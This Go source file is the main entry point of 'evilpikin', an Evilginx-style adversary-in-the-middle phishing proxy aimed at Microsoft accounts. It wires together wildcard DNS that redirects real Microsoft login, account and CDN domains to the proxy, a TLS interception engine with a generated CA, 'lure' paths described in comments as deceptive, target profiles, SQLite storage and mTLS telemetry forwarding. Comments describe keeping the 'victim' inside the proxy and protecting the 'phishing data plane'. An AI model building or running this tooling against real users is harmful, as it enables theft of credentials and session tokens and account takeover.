package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"flag"
	"net"
	"os"
	"strconv"

	"github.com/user/evilpikin/internal/control"
	"github.com/user/evilpikin/internal/dns"
	"github.com/user/evilpikin/internal/firewall"
	"github.com/user/evilpikin/internal/log"
	"github.com/user/evilpikin/pkg/lures"
	"github.com/user/evilpikin/internal/pki"
	"github.com/user/evilpikin/internal/proxy"
	"github.com/user/evilpikin/internal/storage"
	"github.com/user/evilpikin/internal/telemetry"
)

// interceptDomains are REAL Microsoft auth domain suffixes the proxy
// transparently intercepts (DNS resolves them to 127.0.0.1 and the engine
// serves the real hostname, routing it to itself). This is the "strongest
// wildcard": any Microsoft host the live site introduces — password reset,
// MSA/account recovery, CDN — is proxied without pre-listing, keeping the
// victim in-proxy even when a validated callback URI (wreply, redirect_uri)
// points at a real Microsoft host.
var interceptDomainsList = []string{
	"login.live.com",
	"account.live.com",
	"login.microsoftonline.com",
	"login.microsoft.com",
	"account.microsoft.com",
	"www.office.com",
	"office.com",
	"m365.cloud.microsoft",
	"outlook.live.com",
	"auth.gfx.ms",
	"logincdn.msftauth.net",
	"aadcdn.msftauth.net",
	"logincdn.msauth.net",
	"aadcdn.msauth.net",
}

func main() {
	httpAddr := flag.String("http", ":9080", "public http listener address")
	httpsAddr := flag.String("https", ":9443", "public https listener address")
	dbPath := flag.String("db", "evilpikin.db", "sqlite database path")
	targetsDir := flag.String("targets", "configs/targets", "target profiles directory")
	adminWS := flag.String("admin-ws", "", "control-plane websocket URL (mTLS) for telemetry forwarding, e.g. wss://127.0.0.1:8443/ws")
	adminCA := flag.String("admin-ca", "certs/ca.pem", "control-plane client CA (PEM)")
	adminCert := flag.String("admin-cert", "certs/client.pem", "client cert (PEM) for mTLS to control plane")
	adminKey := flag.String("admin-key", "certs/client.key", "client key (PEM) for mTLS to control plane")
	dnsAddr := flag.String("dns", "127.0.0.1:53", "local DNS listen address for wildcard *.<baseDomain> resolution (needs sudo for :53)")
	upstreamDNS := flag.String("upstream-dns", "1.1.1.1:53", "DNS resolver the engine uses to reach REAL origins (must bypass local /etc/resolver intercepts; otherwise the engine resolves its own upstream targets to 127.0.0.1 and bad-gateways)")
	dnsOnly := flag.Bool("dns-only", false, "run ONLY the wildcard DNS helper (bind :53 + write /etc/resolver); run with sudo alongside a non-root engine")
	luresFile := flag.String("lures", "configs/lures.json", "lures definition file (JSON array of {path,target,redirect,landing})")
	flag.Parse()

	if *dnsOnly {
		log.Info("dns-only mode: serving wildcard *.%s + real MS auth domains via %s", "ms.test", *dnsAddr)
		srv := dns.NewServer("ms.test", *dnsAddr)
		srv.SetInterceptDomains(interceptDomainsList)
		srv.Start()
		select {}
	}

	// Root + no explicit ports => bind privileged standard ports 80/443 for the
	// clean https://<domain> URL (Evilginx-style). Dev (non-root) keeps 9080/9443.
	explicitPorts := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == "http" || f.Name == "https" {
			explicitPorts = true
		}
	})
	if !explicitPorts && os.Getuid() == 0 {
		*httpAddr = ":80"
		*httpsAddr = ":443"
	}

	store, err := storage.OpenSQLite(*dbPath)
	if err != nil {
		log.Fatal("storage: %v", err)
	}
	defer store.Close()

	fence := firewall.NewGeoFence()
	hub := telemetry.NewHub()
	engine := proxy.NewEngine()
	proxy.SetUpstreamDNS(*upstreamDNS)
	engine.SetGeoFence(fence)
	engine.SetTelemetry(hub)
	engine.SetStore(store)
	// Operator base domain for cookie scoping / lure masking.
	engine.SetSiteDomain("ms.test")
	// Real Microsoft auth domains to transparently intercept (password reset,
	// MSA recovery, CDN). The engine serves the real hostname; DNS resolves it
	// to 127.0.0.1 so the victim never escapes the proxy.
	engine.SetInterceptDomains(interceptDomainsList)
	// Wildcard local DNS so every dynamically generated <host>.<BaseDomain>
	// alias resolves to 127.0.0.1 without editing /etc/hosts per host, plus the
	// real MS auth domains above.
	dnsSrv := dns.NewServer("ms.test", *dnsAddr)
	dnsSrv.SetInterceptDomains(interceptDomainsList)
	go dnsSrv.Start()
	// Keep browsers on the dev TLS port when rewriting URLs/Location headers
	// (dev uses :9443, not the standard 443) so they never escape the proxy.
	if _, port, err := net.SplitHostPort(*httpsAddr); err == nil && port != "" && port != "443" {
		if p, err := strconv.Atoi(port); err == nil {
			engine.TLSPort = p
		}
	}

	if *adminWS != "" {
		caBytes, err := os.ReadFile(*adminCA)
		if err != nil {
			log.Fatal("read admin CA: %v", err)
		}
		pool := x509.NewCertPool()
		pool.AppendCertsFromPEM(caBytes)
		cli, err := tls.LoadX509KeyPair(*adminCert, *adminKey)
		if err != nil {
			log.Fatal("load admin client cert: %v", err)
		}
		fwd := telemetry.NewWSForwarder(*adminWS, &tls.Config{
			RootCAs:      pool,
			Certificates: []tls.Certificate{cli},
		})
		hub.SetForwarder(func(e telemetry.Event) {
			fwd.Send(e)
		})
		log.Info("telemetry forwarder -> %s", *adminWS)
	}

	if err := storage.LoadTargetsFromDir(store, *targetsDir); err != nil {
		log.Error("seed targets: %v", err)
	}
	targets, err := store.ListTargets()
	if err != nil {
		log.Fatal("list targets: %v", err)
	}
	for _, t := range targets {
		if t.Enabled {
			engine.UpsertTarget(t)
		}
	}
	log.Info("loaded %d target profiles", len(targets))

	// Wire the lure registry so deceptive serve paths (e.g. /login) proxy to the
	// genuine origin landing page. Lures are declared in -lures (configs/lures.json).
	reg := lures.NewRegistry()
	if data, err := os.ReadFile(*luresFile); err == nil {
		var defs []struct {
			Path     string `json:"path"`
			Target   string `json:"target"`
			Redirect string `json:"redirect"`
			Landing  string `json:"landing"`
		}
		if err := json.Unmarshal(data, &defs); err != nil {
			log.Error("parse lures file %s: %v", *luresFile, err)
		} else {
			for _, d := range defs {
				if d.Path == "" || d.Target == "" {
					continue
				}
				l, err := reg.Create(d.Path, d.Target, d.Redirect)
				if err != nil {
					log.Error("create lure %q: %v", d.Path, err)
					continue
				}
				if d.Landing != "" {
					l.LandingPath = d.Landing
				}
			}
		}
	} else {
		log.Info("no lures file at %s (use -lures to enable deceptive paths)", *luresFile)
	}
	engine.SetLures(reg)

	ca, err := pki.LoadOrGenerate("certs/dev-ca.pem", "certs/dev-ca.key")
	if err != nil {
		log.Fatal("dev CA: %v", err)
	}
	resolver := pki.NewResolver(ca)
	pl := proxy.NewPublicListener(engine, resolver, *httpAddr, *httpsAddr)

	api := control.NewControlAPI(store)
	api.SetTelemetryHub(hub)
	api.SetWebDir("web")
	api.OnTargetUpsert(func(t *storage.TargetProfile) {
		if t.Enabled {
			engine.UpsertTarget(t)
		} else {
			engine.RemoveTarget(t.ProxyHost)
		}
	})
	api.OnTargetDelete(func(id string) {
		if t, err := store.GetTarget(id); err == nil {
			engine.RemoveTarget(t.ProxyHost)
		}
	})

	go func() {
		if err := pl.Start(); err != nil {
			log.Fatal("data plane: %v", err)
		}
	}()

	go func() {
		if err := api.Start(); err != nil {
			// The management API is non-critical: a port conflict (e.g. a second
			// instance) must NOT take down the phishing data plane.
			log.Error("control plane: %v (management API unavailable; data plane unaffected)", err)
		}
	}()

	log.Info("evilpikin: data plane (http=%s https=%s) and control plane (127.0.0.1:8080) running", *httpAddr, *httpsAddr)
	select {}
}
